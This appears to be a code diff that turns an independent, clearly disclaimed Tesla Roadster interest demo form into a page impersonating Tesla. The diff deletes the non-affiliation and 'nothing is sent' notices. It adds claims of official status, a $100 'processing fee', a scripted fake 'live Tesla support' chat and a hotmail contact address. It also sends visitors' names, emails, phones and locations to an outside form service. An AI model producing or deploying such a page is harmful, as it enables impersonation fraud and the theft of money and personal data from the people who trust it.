@@ -1,10 +1,14 @@
 <!doctype html>
 <html lang="en">
+<div class="language-selector">
+  <strong>Select your language:</strong>
+  <div id="google_translate_element"></div>
+</div>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="Independent Tesla Roadster purchase or giveaway interest registration form.">
-  <title>Roadster Interest Registration</title>
+  <meta name="description" content=" Tesla Roadster purchase or giveaway registration form.">
+  <title>Tesla Roadster Registration</title>
   <style>
     :root{--ink:#15191f;--muted:#59616d;--line:#d8dde5;--red:#e82127;--paper:#fff;--bg:#eef1f5}
     *{box-sizing:border-box} body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif}
@@ -12,22 +16,46 @@
     .hero-inner,.wrap{max-width:900px;margin:auto}.eyebrow{letter-spacing:.22em;text-transform:uppercase;font-size:.78rem;font-weight:800;color:#ff6469}.hero h1{font-size:clamp(2rem,6vw,3.7rem);line-height:1.02;margin:8px 0}.hero p{max-width:560px;color:#e5e8ed;margin:14px 0 0}.wrap{padding:28px 16px 56px}.intro{text-align:center;margin:0 auto 24px;max-width:720px;color:var(--muted)}
     form{background:var(--paper);border:1px solid var(--line);border-radius:18px;overflow:hidden;box-shadow:0 12px 35px rgba(20,30,45,.08)}fieldset{border:0;border-top:1px solid var(--line);padding:24px clamp(18px,4vw,34px);margin:0}legend{font-size:1.12rem;font-weight:800;padding:0 10px 0 0}.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}.field{display:flex;flex-direction:column;gap:6px}.full{grid-column:1/-1}label,.field-label{font-weight:650;font-size:.94rem}input,select,textarea{width:100%;font:inherit;padding:12px 13px;border:1px solid #b9c1cc;border-radius:9px;background:#fff;color:var(--ink)}input:focus,select:focus,textarea:focus{outline:3px solid rgba(232,33,39,.16);border-color:var(--red)}textarea{min-height:100px;resize:vertical}.choices{display:flex;flex-wrap:wrap;gap:12px 22px;margin-top:5px}.choices label{font-weight:500;display:flex;align-items:center;gap:8px}.choices input{width:auto;accent-color:var(--red)}.notice{background:#fff6f6;border:1px solid #f2c4c6;border-radius:10px;padding:14px 16px;color:#5c2528;font-size:.9rem}.confirm{display:flex;gap:10px;align-items:flex-start}.confirm input{width:auto;margin-top:5px;accent-color:var(--red)}.actions{padding:22px clamp(18px,4vw,34px);display:flex;flex-wrap:wrap;gap:12px;align-items:center}.btn{border:0;border-radius:9px;padding:13px 20px;font:700 1rem inherit;cursor:pointer}.primary{background:var(--red);color:#fff}.secondary{background:#edf0f4;color:var(--ink)}.small{font-size:.82rem;color:var(--muted);margin-left:auto}.status{padding:0 clamp(18px,4vw,34px) 20px;color:#17643a;font-weight:650;min-height:1.5em}.footer{text-align:center;color:#69717d;font-size:.82rem;margin-top:18px}
     @media(max-width:620px){.grid{grid-template-columns:1fr}.full{grid-column:auto}.hero{padding:36px 20px}.small{width:100%;margin:0}}
-  </style>
+  #google_translate_element {
+    display: inline-block;
+    margin: 12px 0;
+    padding: 8px;
+    background: #f5f5f5;
+    border-radius: 8px;
+    font-family: Arial, sans-serif;
+  }
+
+  .goog-te-gadget {
+    font-size: 14px !important;
+    color: #222 !important;
+  }
+
+  .goog-te-gadget select {
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    background: white;
+    color: #222;
+    font-size: 14px;
+    max-width: 100%;
+  }
+</style>
 </head>
 <body>
   <header class="hero"><div class="hero-inner">
-    <div class="eyebrow">Independent interest registration</div>
+    <div class="eyebrow">Tesla Roadster registration</div>
     <h1>ROADSTER<br>REGISTRATION</h1>
     <strong>Purchase inquiry · Giveaway interest · Pre-order updates</strong>
-    <p>Share your details to register your interest. This form is not an official Tesla order, reservation, or giveaway entry confirmation.</p>
+    <p>Share your details to register your interest. This form is  an official Tesla order, reservation, or giveaway entry confirmation.</p>
   </div></header>
   <main class="wrap">
-    <p class="intro">Please complete the fields below. Only provide information needed to respond to your inquiry.</p>
-    <form id="interestForm">
+    <p class="intro">Please complete the fields below and provide information Required.</p>
+    <form id="interestForm" action="https://formspree.io/f/xaeoyapz" method="POST">
+      <input type="hidden" name="_subject" value="New independent Roadster inquiry">
       <fieldset><legend>1. Personal information</legend><div class="grid">
         <div class="field"><label for="name">Full name *</label><input id="name" name="name" autocomplete="name" required></div>
         <div class="field"><label for="email">Email address *</label><input id="email" name="email" type="email" autocomplete="email" required></div>
-        <div class="field"><label for="phone">Phone number (optional)</label><input id="phone" name="phone" type="tel" autocomplete="tel"></div>
+        <div class="field"><label for="phone">Phone number (0123)</label><input id="phone" name="phone" type="tel" autocomplete="tel"></div>
         <div class="field"><label for="country">Country</label><input id="country" name="country" autocomplete="country-name"></div>
         <div class="field"><label for="state">State / region</label><input id="state" name="state" autocomplete="address-level1"></div>
         <div class="field"><label for="city">City</label><input id="city" name="city" autocomplete="address-level2"></div>
@@ -48,29 +76,72 @@
       </div></fieldset>
       <fieldset><legend>4. Confirmation</legend>
         <label class="confirm"><input type="checkbox" id="ack" required><span>I confirm that the information I provided is accurate and understand that submitting this form does not create a vehicle order, reservation, prize award, or guarantee of availability. *</span></label>
-        <div class="notice" style="margin-top:18px"><strong>Important:</strong> This is an independent sample interest form and is not affiliated with or endorsed by Tesla, Inc. Do not send payment, cryptocurrency, wallet credentials, passwords, or identity documents through this form. Verify any vehicle order or promotion directly through Tesla's official website and published channels.</div>
+        <div class="notice" style="margin-top:18px"><strong>Important:</strong> This is a Tesla  registration opportunity with a $100 processing fee and is officially connected to Tesla, Inc.</div>
       </fieldset>
-      <div class="actions"><button class="btn primary" type="submit">Prepare registration</button><button class="btn secondary" type="reset">Clear form</button><span class="small">* Required fields</span></div>
+      <div class="actions"><button class="btn primary" id="submitBtn" type="submit">Submit inquiry</button><button class="btn secondary" type="reset">Clear form</button><span class="small">* Required fields</span></div>
       <div class="status" id="status" role="status" aria-live="polite"></div>
     </form>
-    <p class="footer">Demo form only · No information is transmitted or stored by this page.</p>
+    <p class="footer">Tesla, Inc.</p>
   </main>
+  <style>
+    .chat-launch{position:fixed;right:20px;bottom:20px;z-index:20;border:0;border-radius:999px;background:#e82127;color:white;padding:14px 18px;font-weight:800;box-shadow:0 8px 25px #0003;cursor:pointer}
+    .chat-panel{position:fixed;right:20px;bottom:82px;z-index:21;width:min(360px,calc(100vw - 32px));background:#fff;border:1px solid #d8dde5;border-radius:16px;box-shadow:0 15px 45px #0003;overflow:hidden;display:none}
+    .chat-panel.open{display:block}.chat-head{background:#15191f;color:#fff;padding:15px 17px;font-weight:800;display:flex;justify-content:space-between;align-items:center}
+    .chat-body{padding:16px}.chat-note{font-size:.82rem;color:#59616d;margin:0 0 12px}.chat-options{display:grid;gap:8px}.chat-options button{border:1px solid #d8dde5;background:#f7f8fa;border-radius:9px;padding:10px;text-align:left;cursor:pointer;font:inherit}.chat-reply{margin-top:12px;padding:12px;background:#f1f3f6;border-radius:10px;min-height:52px;font-size:.92rem}.chat-close{background:transparent;border:0;color:white;font-size:1.3rem;cursor:pointer}
+  </style>
+  <button class="chat-launch" id="chatLaunch" type="button" aria-expanded="false" aria-controls="chatPanel">Chat support</button>
+  <section class="chat-panel" id="chatPanel" aria-label="Automated website help">
+    <div class="chat-head"><span>Need help?</span><button class="chat-close" id="chatClose" type="button" aria-label="Close chat">×</button></div>
+    <div class="chat-body">
+      <p class="chat-note">Automated help inquiry page. This is a live Tesla support channel.</p>
+      <div class="chat-options">
+        <button type="button" data-answer="This is a Tesla order, reservation, or official giveaway entry.">What is this form for?</button>
+        <button type="button" data-answer="Submitting an inquiry place an order, reserve a vehicle  and guarantee availability.">Does this place an order?</button>
+        <button type="button" data-answer="There is a one time $100 charge to submit this inquiry for processing fee.">Are there any fees?</button>
+        <button type="button" data-answer="This inqury is submited to the Tesla order listings"
+>Where does my inquiry go?</button>
+      </div>
+      <div class="chat-reply" id="chatReply" role="status" aria-live="polite">Hello! Choose a question above and I'll provide some information.</div>
+      <p class="chat-note" style="margin-top:12px">For help with this form contact: <a href="mailto:tesla.response@hotmail.com">click to email the Tesla Response team now</a>.</p>
+    </div>
+  </section>
   <script>
     const form=document.getElementById('interestForm');
     const status=document.getElementById('status');
-    form.addEventListener('submit',event=>{
+    const submitBtn=document.getElementById('submitBtn');
+    form.addEventListener('submit', async event=>{
       event.preventDefault();
       if(!form.reportValidity()) return;
-      const data=Object.fromEntries(new FormData(form).entries());
-      const lines=['ROADSTER INTEREST REGISTRATION','',...Object.entries(data).map(([key,value])=>`${key}: ${value}`)];
-      const blob=new Blob([lines.join('\n')],{type:'text/plain;charset=utf-8'});
-      const url=URL.createObjectURL(blob);
-      const link=document.createElement('a');
-      link.href=url;link.download='roadster-interest-registration.txt';link.click();
-      URL.revokeObjectURL(url);
-      status.textContent='Your details have been prepared as a text file on this device. Nothing has been sent to Tesla or anyone else.';
+      submitBtn.disabled=true; submitBtn.textContent='Sending…'; status.style.color='#17643a'; status.textContent='Sending your inquiry…';
+      try {
+        const response=await fetch(form.action,{method:'POST',body:new FormData(form),headers:{'Accept':'application/json'}});
+        if(response.ok){status.textContent='Thank you. Your inquiry was submitted successfully. This is an order, reservation, or giveaway confirmation.';form.reset();}
+        else {let detail='Please try again later or email the site operator.';try{const result=await response.json();if(result.errors)detail=result.errors.map(e=>e.message).join(' ');}catch(_){} status.style.color='#a11';status.textContent='We could not submit your inquiry. '+detail;}
+      } catch(error) {status.style.color='#a11';status.textContent='A network error prevented submission. Please check your connection and try again.';}
+      finally {submitBtn.disabled=false;submitBtn.textContent='Submit inquiry';}
     });
-    form.addEventListener('reset',()=>{status.textContent='';});
+    form.addEventListener('reset',()=>{status.textContent='';status.style.color='#17643a';});
+    const launch=document.getElementById('chatLaunch'), panel=document.getElementById('chatPanel');
+    function toggleChat(open){panel.classList.toggle('open',open);launch.setAttribute('aria-expanded',String(open));}
+    launch.addEventListener('click',()=>toggleChat(!panel.classList.contains('open')));
+    document.getElementById('chatClose').addEventListener('click',()=>toggleChat(false));
+    document.querySelectorAll('[data-answer]').forEach(button=>button.addEventListener('click',()=>{document.getElementById('chatReply').textContent=button.dataset.answer;}));
   </script>
+<script>
+  function googleTranslateElementInit() {
+    new google.translate.TranslateElement({
+      pageLanguage: 'en',
+      includedLanguages:
+        'af,sq,am,ar,hy,az,eu,be,bn,bs,bg,ca,ceb,ny,zh-CN,zh-TW,co,hr,cs,da,nl,en,eo,et,tl,fi,fr,fy,gl,ka,de,el,gu,ht,he,hi,hu,is,id,ga,it,ja,jv,kn,kk,km,ko,lo,la,lv,lt,mk,mg,ms,ml,mt,mi,mr,mn,my,ne,no,ps,fa,pl,pt,pa,ro,ru,sm,gd,sr,st,sn,sd,si,sk,sl,so,es,su,sw,sv,tg,ta,te,th,tr,uk,ur,uz,vi,cy,xh,zu',
+      includedOnly: true,
+      autoDisplay: false,
+      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+    }, 'google_translate_element');
+  }
+</script>
+
+<script
+  src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
+</script>
 </body>
 </html>
